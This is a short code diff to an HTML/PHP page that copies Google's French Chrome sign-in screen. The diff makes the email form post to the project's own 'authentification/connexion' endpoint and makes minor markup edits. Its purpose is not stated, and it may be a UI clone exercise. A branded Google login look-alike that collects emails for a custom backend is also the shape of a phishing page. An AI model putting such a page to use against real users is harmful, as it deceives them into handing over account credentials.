@@ -35,16 +35,17 @@
         </div>
         <h2>Se connecter à Chrome</h2>
         <p>Utiliser votre compte Google</p>
-        <form>
+        <form  method="post"  action="<?php echo URL;?>index.php/authentification/connexion/"
+        >
             <div class="inputBox">
-                <input type="email" name="email" required="" onkeyup="this.setAttribute('value', this.value);" value="">
+                <input type="email" name="email1" required="" onkeyup="this.setAttribute('value', this.value);" value="">
                 <label>Adresse e-mail ou numéro de téléphone</label>
             </div>
             <div class="forgot">
                 <button type="button">Adresse e-mail oublié?</button>
             </div>
-            <div class="safety">
-                <p>S'il ne s'agit pas de votre ordinateur, utilisez le mode Invité pour vous connecter en mode privé. <a href="">En savoir plus</a></p>
+            <div class="">
+                <span>S'il ne s'agit pas de votre ordinateur, utilisez le mode Invité pour vous connecter en mode privé. <a href="">En savoir plus</a></span>
             </div>
             <div class="compte">
                 <div class="button-compte">
